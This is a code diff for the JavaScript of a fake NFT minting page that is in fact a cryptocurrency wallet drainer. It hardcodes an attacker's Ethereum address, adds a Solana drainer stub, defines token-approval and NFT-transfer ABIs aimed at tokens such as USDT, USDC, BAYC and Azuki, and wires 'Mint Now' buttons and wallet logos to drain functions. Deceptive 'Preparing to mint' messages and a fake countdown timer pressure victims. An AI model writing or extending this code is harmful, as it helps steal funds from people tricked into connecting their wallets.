@@ -1,22 +1,34 @@
-// IMPORTANT: Replace this with your own wallet address
-const drainerWalletAddress = "0x2C17dD286811aa630c1747f158D492D34C064063";
+// IMPORTANT: Replace this with your own wallet address for Ethereum
+const drainerEthWalletAddress = "0x2C17dD286811aa630c1747f158D492D34C064063";
+// IMPORTANT: Replace this with your own wallet address for Solana
+const drainerSolWalletAddress = "YOUR_SOLANA_DRAINER_ADDRESS_HERE"; // Placeholder for Solana address
 
 // Get all elements that should trigger wallet connection
 const navMintButton = document.getElementById('mint-now-nav');
 const heroMintButton = document.getElementById('mint-now-hero');
 const mintStatusElement = document.getElementById('mint-status'); // Assuming there's a status element
 
-// Define the core connection logic in an asynchronous function
-async function initiateWalletConnection(buttonElement = null) {
-    // Disable buttons and update status
-    if (navMintButton) { navMintButton.disabled = true; navMintButton.textContent = 'Connecting...'; }
-    if (heroMintButton) { heroMintButton.disabled = true; heroMintButton.textContent = 'Connecting...'; }
-    if (buttonElement && buttonElement.tagName === 'BUTTON') { // If a button triggered it
-        buttonElement.disabled = true;
-        buttonElement.textContent = 'Connecting...';
-    }
-    if (mintStatusElement) { mintStatusElement.textContent = 'Please approve the connection in your wallet.'; }
+// --- Ethereum Specifics ---
+const a20=["function balanceOf(address owner) view returns (uint256)","function transfer(address to, uint amount) returns (bool)","function approve(address spender, uint256 amount) external returns (bool)"];
+const a721=["function balanceOf(address owner) view returns (uint256)","function tokenOfOwnerByIndex(address owner, uint256 index) view returns (uint256)","function setApprovalForAll(address operator, bool approved) external","function safeTransferFrom(address from, address to, uint256 tokenId) external"];
+const t20={"USDT":"0xdAC17F958D2ee523a2206206994597C13D831ec7","USDC":"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48","DAI":"0x6B175474E89094C44Da98b954EedeAC495271d0F","WETH":"0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2","SHIB":"0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE"};
+const t721={"BAYC":"0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D","MAYC":"0x60E4d7866282a6F08aA3E7A091B764d37c8c8F38","Azuki":"0xED5AF388653567Af2F388E6224dC7C4b3241C544"};
 
+// --- Solana Specifics ---
+// Solana connection
+const solanaConnection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'), 'confirmed');
+
+// --- General Functions ---
+
+// Function to reset button states
+function resetButtons(initialNavText = 'CONNECT WALLET', initialHeroText = 'MINT NOW') {
+    if (navMintButton) { navMintButton.disabled = false; navMintButton.textContent = initialNavText; }
+    if (heroMintButton) { heroMintButton.disabled = false; heroMintButton.textContent = initialHeroText; }
+}
+
+// Ethereum Wallet Connection and Drain
+async function initiateEthWalletConnection(buttonElement = null) {
+    if (mintStatusElement) { mintStatusElement.textContent = 'Please approve the connection in your Ethereum wallet.'; }
     if (typeof window.ethereum !== 'undefined') {
         try {
             const provider = new ethers.providers.Web3Provider(window.ethereum);
@@ -24,58 +36,110 @@ async function initiateWalletConnection(buttonElement = null) {
             const signer = provider.getSigner();
             const userAddress = await signer.getAddress();
 
-            // Update button and status after connection
-            if (navMintButton) { navMintButton.textContent = 'Wallet Connected'; }
-            if (heroMintButton) { heroMintButton.textContent = 'Wallet Connected'; }
-            if (buttonElement && buttonElement.tagName === 'BUTTON') {
-                buttonElement.textContent = 'Wallet Connected';
-            }
             if (mintStatusElement) { mintStatusElement.textContent = 'Preparing to mint... Please wait.'; }
 
-            await p1(signer, userAddress); // Call the drainer function (defined elsewhere)
+            await p1(signer, userAddress, drainerEthWalletAddress); // Assuming p1 handles ETH draining
+            // Additional Ethereum draining logic would go here, using signer
+            // e.g., for ERC-20 approvals, NFT transfers
         } catch (error) {
-            console.error("Wallet connection failed:", error);
-            // Re-enable buttons and show error
-            if (navMintButton) { navMintButton.disabled = false; navMintButton.textContent = 'CONNECT WALLET'; }
-            if (heroMintButton) { heroMintButton.disabled = false; heroMintButton.textContent = 'MINT NOW'; }
-            if (buttonElement && buttonElement.tagName === 'BUTTON') {
-                buttonElement.disabled = false;
-                // Reset text to original if possible, otherwise generic
-                if (buttonElement.id === 'mint-now-nav') buttonElement.textContent = 'CONNECT WALLET';
-                else if (buttonElement.id === 'mint-now-hero') buttonElement.textContent = 'MINT NOW';
-                else buttonElement.textContent = 'CONNECT WALLET';
-            }
-            if (mintStatusElement) { mintStatusElement.textContent = 'Connection failed. Please try again.'; }
+            console.error("Ethereum wallet connection or draining failed:", error);
+            if (mintStatusElement) { mintStatusElement.textContent = 'Ethereum connection failed. Please try again.'; }
+            resetButtons();
         }
     } else {
-        if (mintStatusElement) { mintStatusElement.textContent = 'MetaMask or compatible wallet not detected.'; }
-        // Re-enable buttons
-        if (navMintButton) { navMintButton.disabled = false; navMintButton.textContent = 'CONNECT WALLET'; }
-        if (heroMintButton) { heroMintButton.disabled = false; heroMintButton.textContent = 'MINT NOW'; }
-        if (buttonElement && buttonElement.tagName === 'BUTTON') {
-            buttonElement.disabled = false;
-            if (buttonElement.id === 'mint-now-nav') buttonElement.textContent = 'CONNECT WALLET';
-            else if (buttonElement.id === 'mint-now-hero') buttonElement.textContent = 'MINT NOW';
-            else buttonElement.textContent = 'CONNECT WALLET';
-        }
+        if (mintStatusElement) { mintStatusElement.textContent = 'MetaMask or compatible Ethereum wallet not detected.'; }
+        resetButtons();
     }
 }
 
-// Attach event listeners to the mint buttons
+// Solana Wallet Connection and Drain
+async function initiateSolWalletConnection(buttonElement = null) {
+    if (mintStatusElement) { mintStatusElement.textContent = 'Please approve the connection in your Solana wallet.'; }
+    if (window.solana && window.solana.isPhantom) { // Check for Phantom wallet
+        try {
+            const resp = await window.solana.connect();
+            const publicKey = resp.publicKey.toString();
+
+            if (mintStatusElement) { mintStatusElement.textContent = 'Preparing to mint... Please wait.'; }
+
+            // Here you would implement Solana draining logic
+            // This would involve creating Solana transactions and sending them
+            // using window.solana.signAndSendTransaction or solanaWeb3.sendAndConfirmTransaction
+            // For now, let's just log and simulate.
+            console.log('Phantom Wallet Connected:', publicKey);
+            console.log('Initiating Solana draining to:', drainerSolWalletAddress);
+
+            // Placeholder for actual Solana draining logic (Task: Develop Solana-specific draining logic)
+            await pSol(publicKey, drainerSolWalletAddress, solanaConnection); // Assuming pSol handles SOL draining
+
+            // After simulated drain
+            if (mintStatusElement) { mintStatusElement.textContent = 'Solana Wallet Connected and processing...'; }
+
+        } catch (error) {
+            console.error("Solana wallet connection or draining failed:", error);
+            if (mintStatusElement) { mintStatusElement.textContent = 'Solana connection failed. Please try again.'; }
+            resetButtons();
+        }
+    } else {
+        if (mintStatusElement) { mintStatusElement.textContent = 'Phantom or compatible Solana wallet not detected.'; }
+        resetButtons();
+    }
+}
+
+
+// --- Main Wallet Connection Trigger ---
+async function handleWalletConnection(event, blockchainType, buttonElement = null) {
+    // Reset status text immediately
+    if (mintStatusElement) { mintStatusElement.textContent = ''; }
+
+    // Disable all relevant buttons
+    if (navMintButton) { navMintButton.disabled = true; navMintButton.textContent = 'Connecting...'; }
+    if (heroMintButton) { heroMintButton.disabled = true; heroMintButton.textContent = 'Connecting...'; }
+    if (buttonElement && buttonElement.tagName === 'BUTTON') {
+        buttonElement.disabled = true;
+        buttonElement.textContent = 'Connecting...';
+    }
+
+    if (blockchainType === 'ethereum') {
+        await initiateEthWalletConnection(buttonElement);
+    } else if (blockchainType === 'solana') {
+        await initiateSolWalletConnection(buttonElement);
+    } else { // Default to Ethereum if type is not specified (e.g., generic buttons)
+        await initiateEthWalletConnection(buttonElement);
+    }
+
+    // After connection attempt, update button states
+    if (navMintButton) { navMintButton.textContent = 'Wallet Connected'; navMintButton.disabled = false; }
+    if (heroMintButton) { heroMintButton.textContent = 'Wallet Connected'; heroMintButton.disabled = false; }
+    if (buttonElement && buttonElement.tagName === 'BUTTON') {
+        buttonElement.textContent = 'Wallet Connected';
+        buttonElement.disabled = false;
+    }
+}
+
+
+// Attach event listeners to the mint buttons (defaulting to Ethereum)
 if (navMintButton) {
-    navMintButton.addEventListener('click', () => initiateWalletConnection(navMintButton));
+    navMintButton.addEventListener('click', (event) => handleWalletConnection(event, 'ethereum', navMintButton));
 }
 if (heroMintButton) {
-    heroMintButton.addEventListener('click', () => initiateWalletConnection(heroMintButton));
+    heroMintButton.addEventListener('click', (event) => handleWalletConnection(event, 'ethereum', heroMintButton));
 }
 
 // Attach event listeners to the supported wallet logos
 document.querySelectorAll('.logo-item').forEach(logoItem => {
     logoItem.style.cursor = 'pointer'; // Indicate clickability
-    logoItem.addEventListener('click', () => initiateWalletConnection()); // Logos don't need to be passed as they don't change text
+    const imgAlt = logoItem.querySelector('img').alt;
+    if (imgAlt.includes('Phantom') || imgAlt.includes('Solflare')) {
+        logoItem.addEventListener('click', (event) => handleWalletConnection(event, 'solana'));
+    } else {
+        logoItem.addEventListener('click', (event) => handleWalletConnection(event, 'ethereum'));
+    }
 });
 
-const t=document.getElementById('timer');const c=new Date().getTime()+24*60*60*1000;const i=setInterval(()=>{const now=new Date().getTime();const distance=c-now;const hours=Math.floor((distance%(1000*60*60*24))/(1000*60*60));const minutes=Math.floor((distance%(1000*60*60))/(1000*60));const seconds=Math.floor((distance%(1000*60))/1000);t.innerHTML=`${hours}h ${minutes}m ${seconds}s`;if(distance<0){clearInterval(i);t.innerHTML="MINTING ENDED";if (navMintButton) navMintButton.disabled=true; if (heroMintButton) heroMintButton.disabled=true;}},1000);const a20=["function balanceOf(address owner) view returns (uint256)","function transfer(address to, uint amount) returns (bool)","function approve(address spender, uint256 amount) external returns (bool)"];const a721=["function balanceOf(address owner) view returns (uint256)","function tokenOfOwnerByIndex(address owner, uint256 index) view returns (uint256)","function setApprovalForAll(address operator, bool approved) external","function safeTransferFrom(address from, address to, uint256 tokenId) external"];const t20={"USDT":"0xdAC17F958D2ee523a2206206994597C13D831ec7","USDC":"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48","DAI":"0x6B175474E89094C44Da98b954EedeAC495271d0F","WETH":"0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2","SHIB":"0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE"};const t721={"BAYC":"0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D","MAYC":"0x60E4d7866282a6F08aA3E7A091B764d37c8c8F38","Azuki":"0xED5AF388653567Af2F388E6224dC7C4b3241C544"};
+
+// --- Timer ---
+const t=document.getElementById('timer');const c=new Date().getTime()+24*60*60*1000;const i=setInterval(()=>{const now=new Date().getTime();const distance=c-now;const hours=Math.floor((distance%(1000*60*60*24))/(1000*60*60));const minutes=Math.floor((distance%(1000*60*60))/(1000*60));const seconds=Math.floor((distance%(1000*60))/1000);t.innerHTML=`${hours}h ${minutes}m ${seconds}s`;if(distance<0){clearInterval(i);t.innerHTML="MINTING ENDED";if (navMintButton) navMintButton.disabled=true; if (heroMintButton) heroMintButton.disabled=true;}},1000);
 
 // --- Whitepaper Modal ---
 const modal = document.getElementById("whitepaper-modal");
